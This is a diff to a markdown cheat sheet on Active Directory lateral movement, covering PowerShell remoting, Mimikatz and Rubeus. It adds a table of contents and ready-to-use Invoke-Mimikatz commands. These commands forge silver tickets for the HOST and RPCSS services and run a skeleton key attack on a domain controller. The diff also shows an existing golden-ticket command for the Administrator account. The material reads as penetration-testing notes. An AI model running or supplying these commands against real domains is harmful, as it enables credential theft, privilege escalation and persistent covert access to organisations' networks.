@@ -1,4 +1,23 @@
-## Lateral Movement on Active Directory 
+## AD Lateral Movement
+
+- [PowerShell Remoting](#powershell-remoting)
+    + [Enable PowerShell Remoting From [M$ Documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.2), creates rules on computer firewall to allow remote connections.](#enable-powershell-remoting-from--m--documentation--https---docsmicrosoftcom-en-us-powershell-module-microsoftpowershellcore-enable-psremoting-view-powershell-72---creates-rules-on-computer-firewall-to-allow-remote-connections)
+    + [Create Remote Session [M$ Documented](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2)](#create-remote-session--m--documented--https---docsmicrosoftcom-en-us-powershell-module-microsoftpowershellcore-new-pssession-view-powershell-72-)
+    + [Entering into Existing PSSession](#entering-into-existing-pssession)
+    + [**Remote Execution**](#--remote-execution--)
+- [WinRS](#winrs)
+    + [Execute Remote Command](#execute-remote-command)
+- [MimiKatz PowerShell Port](#mimikatz-powershell-port)
+    + [Dump Credentials on Local Machine](#dump-credentials-on-local-machine)
+    + [OverPass the Hash (OPTH](#overpass-the-hash--opth)
+    + [Get KRBTGT Hash](#get-krbtgt-hash)
+    + [Credentials from Credential Vault](#credentials-from-credential-vault)
+    + [Patch a DC `lsass` process** allowing to use any user with single password. DA privileges are required.](#patch-a-dc--lsass--process---allowing-to-use-any-user-with-single-password-da-privileges-are-required)
+    + [Golden Ticket](#golden-ticket)
+    + [Silver Ticket](#silver-ticket)
+    + [Skeleton Key Attack](#skeleton-key-attack)
+- [Rubeus](#rubeus)
+    + [OverPass The Hash](#overpass-the-hash)
 
 
 ### PowerShell Remoting
@@ -113,6 +132,23 @@ C:> Invoke-Mimikatz -Command '"kerberos::golden /User:<username> /domain:<domain
 # For Administrator User
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> 
     /aes256:krbtgt_aes_key> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+##### Silver Ticket
+```powershell
+# Get Privileges to access HOST service as Administrator con host
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn> 
+    /service:HOST /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
+    
+# Privileges for RPCSS service
+C:> Invoke-Mimikatz -Command '0"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn>  
+    /service:RPCSS /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
+    
+# With this two tickets, can execute WMI commands on host
+```
+##### Skeleton Key Attack
+```powershell
+# To run on DC. Allows init session with password mimikatz
+C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 ```
 ### Rubeus
 ---
